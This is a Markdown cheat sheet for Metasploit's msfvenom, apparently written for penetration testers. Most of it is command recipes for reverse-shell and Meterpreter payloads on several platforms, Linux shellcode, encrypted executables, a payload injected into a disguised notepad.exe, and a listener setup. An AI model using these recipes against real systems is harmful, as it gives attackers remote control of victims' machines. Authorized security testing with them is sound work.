# msfvenom — payload generator

- **Version:** bundled with Metasploit 6.5.10-dev
- **Binary:** `/usr/bin/msfvenom`
- **Full help snapshot:** [`help.txt`](help.txt)
- **Docs:** https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- **Source:** https://github.com/rapid7/metasploit-framework

> **Deep-research scenarios:** [`SCENARIOS.md`](SCENARIOS.md)

## What it does

msfvenom generates standalone payloads (executables, scripts, shellcode, documents)
in many formats and architectures. It replaced `msfpayload` + `msfencode`. It can
encode, encrypt, embed into templates, and avoid bad characters.

## Use cases

| Situation | Approach |
|-----------|----------|
| Reverse shell binary | `-p <os>/<arch>/meterpreter/reverse_tcp -f exe` |
| Script payload | `-f python`, `-f php`, `-f bash`, `-f powershell` |
| Raw shellcode for exploit dev | `-f raw` / `-f c` |
| Embed in a document | `-f pdf`, `-f doc`, `-f xls` (legacy) |
| Custom EXE template | `-x template.exe -k` |
| Avoid bad chars | `-b '\x00\x0a\x0d'` |
| Encrypt payload | `--encrypt aes256 --encrypt-key ...` |
| Android APK | `-p android/meterpreter/reverse_tcp -f raw` (then build APK) |

## Basic syntax

```bash
msfvenom -p <payload> <OPTIONS> -f <format> -o <file>
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe
```

## Flag reference

| Flag | Meaning |
|------|---------|
| `-p, --payload <name>` | Payload module |
| `-l, --list <type>` | List `payloads`, `encoders`, `nops`, `platforms`, `archs`, `encrypt`, `formats`, `all` |
| `--list-options` | Show options for the chosen payload |
| `-f, --format <fmt>` | Output format (exe, elf, raw, c, python, php, asp, jsp, war, psh, bash, etc.) |
| `-e, --encoder <enc>` | Encoder (legacy) |
| `-i, --iterations <n>` | Encode N times |
| `-a, --arch <arch>` | Architecture (x86, x64, arm, aarch64, ...) |
| `--platform <platform>` | windows, linux, osx, android, php, python, ... |
| `-o, --out <path>` | Output file |
| `-b, --bad-chars <list>` | Bytes to avoid, e.g. `'\x00\xff'` |
| `-n, --nopsled <len>` | Prepend NOP sled |
| `--pad-nops` | Pad to total size with NOPs |
| `-s, --space <len>` | Max payload size |
| `--encoder-space <len>` | Max encoded size |
| `-c, --add-code <file>` | Add additional win32 shellcode |
| `-x, --template <file>` | Use custom executable as template |
| `-k, --keep` | Keep template behavior, inject payload in new thread |
| `-v, --var-name <name>` | Variable name for source-code formats |
| `--smallest` | Try to produce smallest payload |
| `--encrypt <type>` | Encrypt/encode shellcode (aes256, rc4, base64, ...) |
| `--encrypt-key <key>` / `--encrypt-iv <iv>` | Encryption parameters |
| `--service-name <name>` | Service name for service binaries |
| `--sec-name <name>` | Section name for large Windows binaries |
| `-t, --timeout <sec>` | STDIN read timeout |
| `-h, --help` | Help |

## Payload naming

```
<platform>/<arch>/<payload>
<platform>/<arch>/<stager>/<stage>
```

Examples:

| Payload | Type |
|---------|------|
| `windows/x64/meterpreter/reverse_tcp` | Staged Meterpreter |
| `windows/x64/meterpreter_reverse_tcp` | Stageless Meterpreter |
| `linux/x64/shell_reverse_tcp` | Stageless shell |
| `linux/x64/meterpreter/reverse_tcp` | Staged Meterpreter |
| `osx/x64/shell_reverse_tcp` | macOS shell |
| `php/meterpreter/reverse_tcp` | PHP stager |
| `python/meterpreter/reverse_tcp` | Python stager |
| `java/jsp_shell_reverse_tcp` | JSP shell |
| `android/meterpreter/reverse_tcp` | Android |

**Staged vs stageless:**
- *Staged* (`.../meterpreter/reverse_tcp`) is small; the stager downloads the
  stage. Needs a matching handler.
- *Stageless* (`.../meterpreter_reverse_tcp`) is larger but self-contained.

## Recipes

### Windows

```bash
# x64 Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

# Stageless Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f psh -o shell.ps1

# Embed into a signed template
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x notepad.exe -k -f exe -o notepad-updated.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f dll -o shell.dll
```

### Linux / macOS

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o msf.elf
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o shell.macho
```

### Scripts / web

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.py
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f war -o shell.war
msfvenom -p bash/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.sh
```

### Exploit-dev shellcode

```bash
# Raw shellcode
msfvenom -p linux/x64/exec CMD=/bin/sh -f raw -o sc.bin

# C array
msfvenom -p linux/x64/exec CMD=/bin/sh -f c

# Python
msfvenom -p linux/x64/exec CMD=/bin/sh -f python -v shellcode

# Avoid null/newline bytes
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x0a\x0d' -f c
```

### Encryption

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
  --encrypt aes256 --encrypt-key 0123456789abcdef0123456789abcdef \
  --encrypt-iv 0123456789abcdef -f exe -o enc.exe
```

(Encryption only obfuscates; it is not AV evasion.)

## Listing

```bash
msfvenom -l payloads | less
msfvenom -l formats
msfvenom -l encoders
msfvenom -l archs
msfvenom -l platforms
msfvenom -l encrypt
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

## Matching handler

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

## Gotchas

- Encoders and encryption do **not** bypass modern AV/EDR. Expect detection.
- Architecture and platform must match the target; an x64 payload won't run on x86.
- `LHOST` must be reachable; NAT/firewalls break reverse shells.
- Staged payloads need the exact matching handler and a working stager channel.
- `-x` template injection can corrupt signed binaries or trigger AV.
- Generated binaries are for authorized testing only.
- Prefer stageless for unreliable networks; prefer staged for tight size limits.
- Some formats (e.g. `doc`, `pdf`) are legacy and often non-functional.

## References

- Docs: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- Payload list: `msfvenom -l payloads`
- Source: https://github.com/rapid7/metasploit-framework
